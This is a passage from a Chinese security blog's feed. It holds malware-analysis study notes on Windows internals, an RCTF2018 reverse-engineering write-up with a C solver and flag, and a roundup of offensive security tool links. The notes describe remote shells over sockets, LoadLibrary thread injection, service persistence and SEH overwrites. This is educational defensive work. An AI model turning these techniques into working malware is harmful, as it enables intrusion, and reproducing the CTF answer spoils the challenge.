id="2-网络的服务器和客户端"><a href="#2-网络的服务器和客户端" class="headerlink" title="2. 网络的服务器和客户端"></a>2. 网络的服务器和客户端</h3><p>一个网络程序通常有两个端点:服务器端，它维护一个打开套接字并等待入站连接：客户端，它连接到一个正在等待的套接字。而恶意代码可以是这两端中的任意一个。</p><h3 id="3-WinINet-API"><a href="#3-WinINet-API" class="headerlink" title="3. WinINet API"></a>3. WinINet API</h3><p><img src="https://i.loli.net/2018/07/19/5b50201135003.jpg" alt="mark"></p><h2 id="7x4-跟踪恶意代码的运行"><a href="#7x4-跟踪恶意代码的运行" class="headerlink" title="7x4 跟踪恶意代码的运行"></a>7x4 跟踪恶意代码的运行</h2><h3 id="1-DLL"><a href="#1-DLL" class="headerlink" title="1. DLL"></a>1. DLL</h3><blockquote><p>动态链接库（DLL)是使用库来在多个应用程序之间共享代码的Windows特有方式。一个DLL程序是不能独自运行的可执行文件，但它可以导出一些被其他应用程序使用的函数。<br>被DLL程序使用的内存可以在正运行的进程之间共享。<br>在发布一个可执行文件时，你可以使用Windows系统上已 知的DLL程序，而无须去重新发布它们。这帮助软件开发者和恶意代码作者最小化发布软件的大小规模。<br>DLL程序也是一种有用的代码复用方式</p></blockquote><h4 id="恶意代码作者如何使用DLL"><a href="#恶意代码作者如何使用DLL" class="headerlink" title="恶意代码作者如何使用DLL"></a>恶意代码作者如何使用DLL</h4><blockquote><p>保存恶意代码<br>通过使用Windows DLL<br>通过使用第三方DLL</p></blockquote><h4 id="基本DLL结构"><a href="#基本DLL结构" class="headerlink" title="基本DLL结构"></a>基本DLL结构</h4><blockquote><p>DLL使用PE文件格式，并且只有一个单一标志，指示这个文件是一个<br>DLL,而不是一个.exeDLL经常有更多导出函数，并且通常导入函数较少。<br>DLL的主函数是DllMain。它没有标记，而且并不是一个DLL中的导出函数，但是它在PE头中被指定为文件的入口点。任何时候一个进程加载或卸载库，会创建一个新线程，或一个已程结束时，这个函数都会被调用来通知DLL。这个通知允许DLL来管理每个进程或每个线程的资源存在的线<br>程的资源。</p></blockquote><h3 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h3><h4 id="创建一个新进程"><a href="#创建一个新进程" class="headerlink" title="创建一个新进程"></a>创建一个新进程</h4><p>恶意代码最常使用的创建新进程函数是CreateProcess</p><blockquote><p>恶意代码通常使用C reateP rocess,来创建一个简单的远程shell- CreateProcess函数的一个参数，STARTUPINFO结构，包含一个进程的标准输入、标准输出以及标准错误流的句柄。一个恶意程序可以设置这些值为套接字，这样当这个程序写入标准输出时，它实际上会写到套接字上，因而允许一个攻击者执行远程shell,而不需要运行除CreateProcess之外的任何函数。</p></blockquote><h3 id="3-线程"><a href="#3-线程" class="headerlink" title="3. 线程"></a>3. 线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。线程是被CPU执行的独立指令序列，而不需要等待其他线程。一个进程包含一个或多个线程，它们执行进程中的一部分代码。一个进程中的所有线程共享同样的内存空间，但是每一个有它自己的处理器、寄存器和栈。</p><h4 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h4><blockquote><p>当一个线程运行时，它对CPU或CPU核有着完全的控制，并且其他线程不能影响CPU或核的状态。当一个线程改变CPU中某个寄存器的值时，它不会影响任何其他线程。一个操作系统在线程间切换之前，在CPU中的所有值会被保存到一个称为线程上下文的结构体中。然后操作系统加载这个线程上下文到一个新的线程中，并使这个新线程在CPU中执行</p></blockquote><h4 id="创建一个线程"><a href="#创建一个线程" class="headerlink" title="创建一个线程"></a>创建一个线程</h4><blockquote><p>CreateThread函数被用来创建一个新线程。函数的调用者指定一个起始地址，它经常被叫做sta rt函数。执行从这个起始地址开始直到这个函数返回，尽管这个函数不需要返回，这个线程可以在进程结束前一直运行。<br>CreateThread的调用者可以指定线程开始的函数位置，并且一个单一参数可以被传递给这个start函数。这个参数可以是任意值，依赖于这个线程要开始执行的函数。</p><p>• 恶意代码可以使用CreateThread,来加载一个新的恶意库文件到进程中，通过在调用CreateThread时将起始地址设置为Load Library的地址。 （传递给CreateThread的参数是要被加载库的名字。新的DLL被加载到这个进程的内存中，然后DllMain被调用。）<br>• 恶意代码可以为输入和输出创建两个线程：一个用来在套接字或管道上监听，并输出到一个进程的标准输入里，另一个用来从标准输出读取数据，并发送到套接字或管道上，恶意代码的目标是发送所有信息到单一的套接字或管道，来和运行的应用程序进行无缝通信。</p></blockquote><h3 id="4-使用互斥量的进程间协作"><a href="#4-使用互斥量的进程间协作" class="headerlink" title="4. 使用互斥量的进程间协作"></a>4. 使用互斥量的进程间协作</h3><blockquote><p>互斥量（mutex), 在内核中也称为互斥门（mutant)是全局对象，用于协调多个进程和线程。<br>互斥量主要用于控制共享资源的访问，并且经常被恶意代码所使用。<br>同一时刻，只有一个线程拥有一个互斥量。</p><p>线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，井且任何后续线程试图获取对它的访问时，都必须等待。当一个线程完成对互斥量的使用后，需要使用ReleaseMutex函数。</p><p>一个互斥量可以通过CreateMutex函数进行创建。而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。恶意代码通常创建一个互斥量，并试图使用同一个名字来打开一个已存在的互斥量，通过这种方式，可以确定恶意代码一次只有一个唯一实例在运行。</p></blockquote><h3 id="5-服务"><a href="#5-服务" class="headerlink" title="5. 服务"></a>5. 服务</h3><p>恶意代码执行附加代码的另一种方式是将它作为服务安装。Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要它们自己的进程或线程；代码被Windows服务管理器调度和运行，但没有用户输入。在Windows操作系统上的任何指定时间，都会有多个服务在运行。</p><p>服务也提供另一种在系统上维护持久化驻留的方式，因为它们可以被设置成当操作系统启动时 自动运行，并且可能甚至不在任务管理器中作为一个进程显示出来。一个用户查找所有运行的应用程序，也不会找到任何可疑的东西，因为恶意代码不是运行在一个独立进程中。</p><p>服务可以通过一些Windows API函数来进行安装和操作</p><blockquote><p>OpenSCManager： 返回一个服务控制管理器的句柄，它被用来进行所有后续与服务相关的函数调用。所有要和服务交互的代码会调用这个函数。<br>CreateService： 添加一个新服务到服务控制管理器，并且允许调用者指定服务是否在引导时自动启动，或者必须手动启动。<br>StartService： 启动一个服务，并且仅在服务被设置成手动启动时使用。</p></blockquote><p>Windows操作系统支持多种服务类型，它们以独特的方式执行。恶意代码最常使用的是WIN32_SHARE_PR0CESS类型，这种类型将这个服务的代码保存在一个DLL中，并且在一个共享的进程中组合多个同的服务。在任务管理器中，你可以找到一个名为svchost.exe进程的多个实例，它们在运行WIN32_SHARE_PR0CESS类型的服务。</p><blockquote><p>WIN32_OWN_PROCESS类型有时也被使用，因为它在一个.exe文件中保存代码，而且作为一个独立进程运行。</p><p>最后一个常见的服务类型是KERNEL_DRIVER,它被用来加载代码到内核中执行。</p><p>关于本地系统上服务的信息被保存在注册表中。每个服务在HKLM\SYSTEM\CurrentControlSet\Services下面有一个子键。</p></blockquote><h3 id="6-组件对象模型"><a href="#6-组件对象模型" class="headerlink" title="6. 组件对象模型"></a>6. 组件对象模型</h3><p>微软组件对象模型（COM)是一个接口标准，它使得不同软件组件在不知道其他组件代码的接口规范时，相互之间可以进行调用。</p><p>COM可以支持任何编程语言，并且被设计成一种可复用的软件组件，并可以被所有程序所利用。COM使用了一个对象结构，在与面向对象的编程语言中可以很好配合使用，COM也并不排斥非面向对象的编程语言。</p><p>COM被实现成一个客户-服务器框架。客户端是那些使用COM对象的程序，服务器是那些可复用的软件组件——也就是COM对象本身。微软提供了很多COM对象给程序使用。</p><p>每一个使用COM的线程，必须在调用任何其他COM库函数之前，至少调用一次Olelnitialize或CoInitializeEx函数。所以，一个恶意代码分析师可以搜索这些调用，来判断一个程序是否使用了COM功能，然而，知道恶意代码片段作为客户端程序使用COM对象并没有提供很多信息，因为COM对象是繁杂且广泛的。一旦你判断程序在使用COM,你就需要找到一些正在被使用对象的标识符来继续分析。</p><h4 id="CLSID、IID-以及COM对象的使用"><a href="#CLSID、IID-以及COM对象的使用" class="headerlink" title="CLSID、IID ,以及COM对象的使用"></a>CLSID、IID ,以及COM对象的使用</h4><blockquote><p>COM对象通过它们的全局唯一标识符(GUID),分为类型标识符(CLSID)以及接口标识符(IID)来进行访问。</p><p>CoCreatelnstance函数被用来获取对COM功能的访问。恶意代码使用的一个常用函数是Navigate , 它允许一个 程 序 启 动 Internet Explorer, 并访问一 个 Web地 址。Navigate函数是IWebBrowser2组件接口的一部分，这个接口指定了一个必须被实现的函数列表，但是它没有指定哪个程序会提供这个功能。提供这个功能的程序就是实现了IWebBrowser2接口的COM类。在多数例子中，IWebBrowser2接口被Internet Explorer实现。接口通过一个叫做IID的GUID来标识，而COM类通过一个叫做CLS1D的GUID来标识。</p></blockquote><h4 id="COM服务器恶意代码"><a href="#COM服务器恶意代码" class="headerlink" title="COM服务器恶意代码"></a>COM服务器恶意代码</h4><p>有些恶意代码实现了一个恶意COM服务器，继而被其他应用使用。对恶意代码来说，常用的COM服务器功能是通过浏览器帮助对象（B H O ), 这是Internet Explorer的第三方插件。BHO没有限制，所以恶意代码作者使用它们在Internet Explorer®程中运行代码，这允许他们监控互联网流量、跟踪浏览器的使用，以及与互联网通信，而且并不使用它们自己的进程。</p><p>实现一个COM服务器的恶意代码通常很容易检测，因为它导出了几个函数，包括DllCanUnloadNow、DllGetClassObject、Dlllnstall、DI 1 RegisterServer, 以及DllUnregisterServer，它们都必须由COM服务器软件导出。</p><h3 id="7-异常：当事情出错时"><a href="#7-异常：当事情出错时" class="headerlink" title="7. 异常：当事情出错时"></a>7. 异常：当事情出错时</h3><p>异常机制允许一个程序在普通执行流程之外处理事件。多数时间里，异常是由错误引起的，诸如除零错误。当一个异常发生时，执行转移到处理这个异常的特殊例程。有些异常，比如除零异常，是由硬件抛出的；其他的，比如无效内存访问，是由操作系统抛出的。你也可以在代码中使用RaiseException调用，显式地抛出一个异常。</p><p>结构化异常处理(SEH)是Windows的异常处理机制。在一个32位系统中，SEH信息被保存在桟上。</p><p>异常处理器是可嵌套的，并且不是所有的处理器都会对应着所有异常。如果当前帧的异常处理器不处理这个异常，这个异常会被传递给调用者帧的异常处理器。最终，如果这些异常处理器中没有一个响应这个异常，那么顶层的异常处理器将使应用程序崩溃。</p><p>异常处理器可以让恶意代码获得执行机会。一个指向异常处理信息的指针被保存在栈上，在栈溢出时，一个攻击者可以覆盖这个指针。通过指定一个新的异常处理器，攻击者可以在一个异常发生时获得执行机会。</p><h2 id="7x5-内核与用户模式"><a href="#7x5-内核与用户模式" class="headerlink" title="7x5 内核与用户模式"></a>7x5 内核与用户模式</h2><p>Windows使用两种处理器特权级别：内核模式与用户模式。</p><p>几乎所有代码都运行在用户模式，除了操作系统和硬件驱动，它们运行在内核模式。在用户模式，每一个进程有它自己的内存、安全权限，以及资源。如果一个用户模式程序执行一个无效指令并崩溃，Windows可以回收所有资源，并终止这个程序</p><p>通常，用户模式不能直接访问硬件，并且它被限制只能访问CPU上所有寄存器和可用指令的一个子集。为了在用户模式中操作硬件或改变内核中的状态，你必须依赖于Windows API。</p><p>当你调用一个Windows API函数操作内核结构体时，它会通过一个调用进入内核。在反汇编中SYSENTER、SYSCALL或者INT 0x2E的存在，指明一个调用被使用进入到内核。直接通过跳转从用户模式到内核模式是不可能的，这些指令使用查找表来定位一个预定义函数，从而在内核中执行代码。</p><p>所有运行在内核的进程共享资源和内存地址。内核模式代码有更少的安全检查。如果在内核运行的代码执行并且包含无效指令，操作系统就不能继续运行，产生的结果就是著名的Windows蓝屏。</p><p>运行在内核中的代码可以操纵运行在用户空间的代码，但是运行在用户空间的代码只能通过定义好的接口来影响内核。即使所有运行在内核的代码共享内存和资源，处于活跃状态的进程上下文也总是只有一个。</p><h2 id="7x6-原生API"><a href="#7x6-原生API" class="headerlink" title="7x6 原生API"></a>7x6 原生API</h2><p>原生API是用来和Windows进行交互的底层API。<br>调用原生API函数可以绕过普通的Windows API。</p><p>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要数据结构都被保存在内核中，在内核外面的代码 （用户模式代码）是无法访问它们的。微软为了使用户应用程序能够达到必需的功能，创建了一个多步骤的调用过程。<br><img src="https://i.loli.net/2018/07/19/5b5020114d7ce.jpg" alt="mark"></p><p>用户应用程序被给予对用户API (比如kernel32.dll和其他DLL)的访问，这些DLL会调用ntdlLdll,这是一个特殊的DLL程序，它管理用户空间与内核的交互。然后处理器切换到内核模式,并执行一个内核中的函数，通常它位于ntoskrnl.exe中。这个过程是令人费解的，但是内核和用户API之间的分离，允许微软修改内核而不会影响应用程序。</p><p>ntdll函数像内核中的函数一样，使用API和结构体。这些函数组成了原生API。</p><blockquote><p>尽管微软不提供关于原生API的完整文档，还是有网站和书来文档化这些函数。最好的参考书是由GaryNebbett (Sams, 2000)撰写的Windows NT/2000 Native API Reference，尽管它已经很旧了。在线资源如 <a href="http://undocumented.ntinternals.net" target="_blank" rel="noopener">http://undocumented.ntinternals.net</a> 以提供最近的信息。</p></blockquote><p>有一系列的原生API调用可以被用来获取关于系统的信息、进程、线程、句柄，以及其他项目。这 些 包 括 NtQuerySystemlnformation , NtQuerylnformationProcess &gt; NtQuerylnformationThread &gt; NtQuerylnformationFile, 以及NtQuerylnformationKey。这些调用提供比任何可用Win32调用更详细的信息，并且其中一些函数允许你给文件、进程、线程等设置细粒度的属性。</p><p>另一个恶意代码普遍使用的原生API函数是NtContinue。这个函数被用来从一个异常处理返回，并且它的意图是在一个异常被处理后转移执行回到一个程序的主线程。然而，要返回的位置在异常上下文中被指定，并且它可以被修改。恶意代码经常使用这个函数来以复杂的方式转移执行，从而使一个分析师感到困惑，并且使一个程序更加难调试。</p><p>原生应用程序是那些不使用Win32子系统而只调用原生API的应用程序。这样的应用程序对恶意代码来说是罕见的，对非恶意代码来说几乎是不存在的，所以一个原生应用程序很可能就是恶意的。在PE头中的子系统指明了一个程序是不是原生应用程序。</p><p>From <a href="https://kabeor.github.io/第7章 分析恶意Windows程序/">https://kabeor.github.io/第7章 分析恶意Windows程序/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第七章-分析恶意Windows程序&quot;&gt;&lt;a href=&quot;#第七章-分析恶意Windows程序&quot; class=&quot;headerlink&quot; title=&quot;第七章 分析恶意Windows程序&quot;&gt;&lt;/a&gt;第七章 分析恶意Windows程序&lt;/h1&gt;&lt;h2 id=&quot;7x1-W
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2018 babyre WriteUp</title>
    <link href="https://kabeor.github.io/RCTF2018%20babyre%20WriteUp/"/>
    <id>https://kabeor.github.io/RCTF2018 babyre WriteUp/</id>
    <published>2018-05-23T02:17:44.286Z</published>
    <updated>2018-07-16T09:22:21.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCTF2018-babyre-WriteUp"><a href="#RCTF2018-babyre-WriteUp" class="headerlink" title="RCTF2018 babyre WriteUp"></a>RCTF2018 babyre WriteUp</h1><p>题目给了一个压缩包，里面有两个文件<br><img src="https://i.loli.net/2018/07/16/5b4c610c56637.jpg" alt="mark"></p><p>out文件<br><img src="https://i.loli.net/2018/07/16/5b4c610c69bc1.jpg" alt="mark"></p><p>这种题型应该就是<strong>得到算法后枚举，与正确输出的out作比较</strong></p><p>那么首先拿IDA看一下吧</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>先搜索一下字符串吧<br><img src="https://i.loli.net/2018/07/16/5b4c610c7ddcd.jpg" alt="mark"><br>可以看到这些有用的提示，使用交叉引用到汇编指令</p><p>用图形化看一下(最后一张有一点歪了，请原谅)</p><blockquote><p>main函数 0x08048B49<br>比较长，挑重点</p></blockquote><p><img src="https://i.loli.net/2018/07/16/5b4c610c92917.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c610cacf3c.jpg" alt="mark"></p><blockquote><p>返回输出流程 0x804882B</p></blockquote><p> <img src="https://i.loli.net/2018/07/16/5b4c610cc14cd.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c610cd608a.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c610cee796.jpg" alt="mark"></p><p>注意到那个红色的报错了吗，是的，我们现在无法F5<br><img src="https://i.loli.net/2018/07/16/5b4c610d0dda9.jpg" alt="mark"></p><p>显示<strong>sp分析失败</strong><br>经过搜索学习，明白了这种问题一般都是堆栈不平衡导致的，因此我们需要手动调整栈指针</p><p>首先 菜单栏OPtions-&gt;General<br><img src="https://i.loli.net/2018/07/16/5b4c6129b8c3c.jpg" alt="mark"></p><p>打上勾<br>然后回到汇编窗口，找到loc_80848CBB</p><p><img src="https://i.loli.net/2018/07/16/5b4c6129d2384.jpg" alt="mark"></p><p>观察发现，lea和retn处的栈指针都是00，导致问题的出现，因此我们应该运用堆栈平衡原理，将其平衡</p><p>具体来说，想要修改一个位置的指针，需要将鼠标指向这个指针的上一个指针，然后 Alt+K</p><p><img src="https://i.loli.net/2018/07/16/5b4c6129e5917.jpg" alt="mark"></p><p>将里面的0x9C修改为0x0，确认<br><img src="https://i.loli.net/2018/07/16/5b4c612a05caa.jpg" alt="mark"></p><p>现在堆栈平衡，就可以F5了</p><p>当然了，还可以选择GDB动态调试，在出错这里下断点，然后步入看汇编，但因为对汇编看的还不是很熟悉，GDB也不常接触，于是只能F5了(流下没技术的泪水)</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>F5看一下<br><img src="https://i.loli.net/2018/07/16/5b4c612a1b97a.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/16/5b4c612a2f2f2.jpg" alt="mark"></p><p>主函数判断输入格式，v4处可以看到，是将其<strong>八位即四字节一组(int大小为2字节，8/2=4)</strong>进行分组</p><p>然后sub_804882B内是回显<br><img src="https://i.loli.net/2018/07/16/5b4c612a42428.jpg" alt="mark"></p><p>sub_8048A41和sub_8048980不太清楚是干嘛的，应该是初始化和转换之类的</p><p><strong>算法位于sub_80488E0内</strong></p><p>先记住<strong>sub_80488E0(&amp;v6, 0xA72BE4C1, 0x1D082C23, seed, v4, v3);</strong>，后面有用</p><h3 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h3><p><img src="https://i.loli.net/2018/07/16/5b4c612a57264.jpg" alt="mark"></p><p>看到一个30次的循环，嵌套sub_804868B<br>进去看看</p><p><img src="https://i.loli.net/2018/07/16/5b4c612a6b196.jpg" alt="mark"></p><p>现在整个算法的全貌就展示在了我们面前</p><p>逐位循环0x20F次换算成四字节一组也就是0x20F/4=0x7F<br>于是我们只需要从0x20到0x7F进行枚举，按照相应算法对out进行比较即可,注意80488E0一开始传入的两个字符串需要互换然后合并</p><p>解题脚本如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">uint32_t foo(uint32_t a1, uint64_t a2) // sub_804868B</span><br><span class="line">&#123;</span><br><span class="line">    int j;</span><br><span class="line">    uint64_t v5;</span><br><span class="line">    uint32_t in;</span><br><span class="line">    in = a1;</span><br><span class="line">    for (j = 0; j &lt;= 527; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = a2 &gt;&gt; (j &amp; 0x1F);</span><br><span class="line">        if (j &amp; 0x20)</span><br><span class="line">            v5 = v5 &gt;&gt; 32;           //高低位转换 </span><br><span class="line">        in = (in &gt;&gt; 1) ^ ((v5 ^ in ^ (in &gt;&gt; 16) ^ (0x5C743A2E &gt;&gt; (((in &gt;&gt; 1) &amp; 1)</span><br><span class="line">            + 2</span><br><span class="line">            * (2</span><br><span class="line">                * (((in &gt;&gt; 20) &amp; 1)</span><br><span class="line">                    + 2* (2 * (in &gt;&gt; 31) + ((in &gt;&gt; 26) &amp; 1)))</span><br><span class="line">                + ((in &gt;&gt; 9) &amp; 1))))) &lt;&lt; 31);</span><br><span class="line">    &#125;</span><br><span class="line">    return in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t data[30] = // out</span><br><span class="line">    &#123;</span><br><span class="line">        0xB80C91FE,0x70573EFE,</span><br><span class="line">        0xBEED92AE,0x7F7A8193,</span><br><span class="line">        0x7390C17B,0x90347C6C,</span><br><span class="line">        0xAA7A15DF,0xAA7A15DF,</span><br><span class="line">        0x526BA076,0x153F1A32,</span><br><span class="line">        0x545C15AD,0x7D8AA463,</span><br><span class="line">        0x526BA076,0xFBCB7AA0,</span><br><span class="line">        0x7D8AA463,0x9C513266,</span><br><span class="line">        0x526BA076,0x6D7DF3E1,</span><br><span class="line">        0xAA7A15DF,0x9C513266,</span><br><span class="line">        0x1EDC3864,0x9323BC07,</span><br><span class="line">        0x7D8AA463,0xFBCB7AA0,</span><br><span class="line">        0x153F1A32,0x526BA076,</span><br><span class="line">        0xF5650025,0xAA7A15DF,</span><br><span class="line">        0x1EDC3864,0xB13AD888</span><br><span class="line">    &#125;;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t j;</span><br><span class="line">    for (i = 0; i &lt; 30; i++)</span><br><span class="line">        for (j = 0x20; j &lt; 0x7F; j++)                    //0x20F/4=0x7F </span><br><span class="line">            if (foo(j, 0x1D082C23A72BE4C1) == data[i])   //互换，合并 </span><br><span class="line">                printf(&quot;%c&quot;, j);</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><img src="https://i.loli.net/2018/07/16/5b4c612a7fbca.jpg" alt="mark"></p><p>解出： RCTF{Kee1o9_1s_a1ready_so1ved}</p><p>From <a href="https://kabeor.github.io/RCTF2018 babyre WriteUp/">https://kabeor.github.io/RCTF2018 babyre WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RCTF2018-babyre-WriteUp&quot;&gt;&lt;a href=&quot;#RCTF2018-babyre-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;RCTF2018 babyre WriteUp&quot;&gt;&lt;/a&gt;RCTF2018 babyre W
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>写在前面的话</title>
    <link href="https://kabeor.github.io/Top/"/>
    <id>https://kabeor.github.io/Top/</id>
    <published>2018-05-18T14:24:59.000Z</published>
    <updated>2018-07-19T06:50:08.164Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h1><p>一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来</p><h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>先解答一些包括我也很崩溃的问题</p><ol><li>博客为什么加载这么慢，163为什么加载资源失败<blockquote><p>首先我的博客是多图流，图片都是高清或是4K的，我尽量把图片都压缩到500k以下了，js也优化过，是真的尽力了啊。。<br>我侧边栏加了一个网易云音乐的js，如果提示资源加载失败的话，请把代理关了，或者如果不想听歌的话不用管它也行，直接确认好了。<br>然后因为是17届大一，买不起cdn诶，求大佬赞助(偷偷放链接 <a href="http://t.cn/R3YA9gO" target="_blank" rel="noopener">http://t.cn/R3YA9gO</a>)<br>然后其他理由想起来再补充</p></blockquote></li><li>待补充，欢迎提问</li></ol><hr><h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><h3 id="2018-7-19"><a href="#2018-7-19" class="headerlink" title="2018.7.19"></a>2018.7.19</h3><p>练车真的很烦。。。<br><strong>cutter: A Qt and C++ GUI for radare2 reverse engineering framework</strong><br><a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p><strong>PassphraseGen - 用于生成自定义密码短语列表的脚本，方便使用 hashcat 进行密码破解</strong><br><a href="https://github.com/dafthack/PassphraseGen" target="_blank" rel="noopener">https://github.com/dafthack/PassphraseGen</a></p><p><strong>ISSISP 18 符号执行与模糊测试</strong><br><a href="https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPMon.pdf" target="_blank" rel="noopener">https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPMon.pdf</a></p><p><strong>ISSISP 18 基于符号执行的自动程序修复</strong><br><a href="https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPWed.pdf" target="_blank" rel="noopener">https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPWed.pdf</a></p><p><strong>Pwn Adventure 3</strong><br><a href="http://pwnadventure.com/" target="_blank" rel="noopener">http://pwnadventure.com/</a></p><p><strong>通过 Pwn Adventure 3 游戏学习 FRIDA</strong><br><a href="https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/" target="_blank" rel="noopener">https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/</a></p><p><strong>针对 Raspberry Pi 的内核研究</strong><br><a href="http://blog.k3170makan.com/2018/07/reversing-bare-bones-raspberry-pi.html" target="_blank" rel="noopener">http://blog.k3170makan.com/2018/07/reversing-bare-bones-raspberry-pi.html</a></p><p><strong>如何使用 IDAPython 寻找漏洞</strong><br><a href="https://www.somersetrecon.com/blog/2018/7/6/introduction-to-idapython-for-vulnerability-hunting" target="_blank" rel="noopener">https://www.somersetrecon.com/blog/2018/7/6/introduction-to-idapython-for-vulnerability-hunting</a></p><p><strong>killerbee - 攻击 ZigBee 以及 IEEE 802.15.4 网络的工具集</strong><br><a href="https://github.com/riverloopsec/killerbee" target="_blank" rel="noopener">https://github.com/riverloopsec/killerbee</a></p><p><strong>ropgenerator - 帮助构造 ROP 链的工具</strong><br><a href="https://github.com/Boyan-MILANOV/ropgenerator" target="_blank" rel="noopener">https://github.com/Boyan-MILANOV/ropgenerator</a></p><p><strong>Bypass Data Execution Protection绕过方法介绍</strong><br><a href="https://movaxbx.ru/2018/07/16/bypass-data-execution-protection-dep/" target="_blank" rel="noopener">https://movaxbx.ru/2018/07/16/bypass-data-execution-protection-dep/</a></p><p><strong>METASPLOIT TUTORIALS</strong><br><a href="https://www.hackingtutorials.org/category/metasploit-tutorials/" target="_blank" rel="noopener">https://www.hackingtutorials.org/category/metasploit-tutorials/</a></p><p><strong>mcsema - 一款二进制转换工具，可将机器码转换为LLVM中间代码，并提供了 IDA 和binninja 的接口脚本</strong><br><a href="https://github.com/trailofbits/mcsema" target="_blank" rel="noopener">https://github.com/trailofbits/mcsema</a></p><p><strong>Review:Offensive Security Certified Professional (OSCP)</strong><br><a href="https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/" target="_blank" rel="noopener">https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/</a></p><p><strong>如何开始逆向学习与病毒分析</strong><br><a href="https://hshrzd.wordpress.com/how-to-start/" target="_blank" rel="noopener">https://hshrzd.wordpress.com/how-to-start/</a></p><p><strong>对 PE 文件签名的深入研究</strong><br><a href="http://research32.blogspot.com/2016/03/pe-file-signing.html" target="_blank" rel="noopener">http://research32.blogspot.com/2016/03/pe-file-signing.html</a></p><h3 id="2018-7-10"><a href="#2018-7-10" class="headerlink" title="2018.7.10"></a>2018.7.10</h3><p><strong>GBA 游戏机自定义固件的源码</strong><br><a href="https://github.com/ez-flash/omega-kernel" target="_blank" rel="noopener">https://github.com/ez-flash/omega-kernel</a></p><p><strong>warberry - 为树莓派设计的渗透测试工具包</strong><br><a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><p><strong>使用 r2pipe 协助逆向分析</strong><br><a href="https://goggleheadedhacker.com/blog/post/8" target="_blank" rel="noopener">https://goggleheadedhacker.com/blog/post/8</a></p><p><strong>hawkeye - 从文件系统中搜索敏感文件的工具</strong><br><a href="https://github.com/Ice3man543/hawkeye" target="_blank" rel="noopener">https://github.com/Ice3man543/hawkeye</a></p><p><strong>trackerjacker-无线网络追踪工具</strong><br><a href="https://github.com/calebmadrigal/trackerjacker" target="_blank" rel="noopener">https://github.com/calebmadrigal/trackerjacker</a></p><p><strong>weixin:// 跳转研究</strong><br><a href="http://t.cn/Rdpmd8L" target="_blank" rel="noopener">http://t.cn/Rdpmd8L</a></p><p><strong>collection-document:优质安全文章收藏,长期更新</strong><br><a href="https://github.com/tom0li/collection-document" 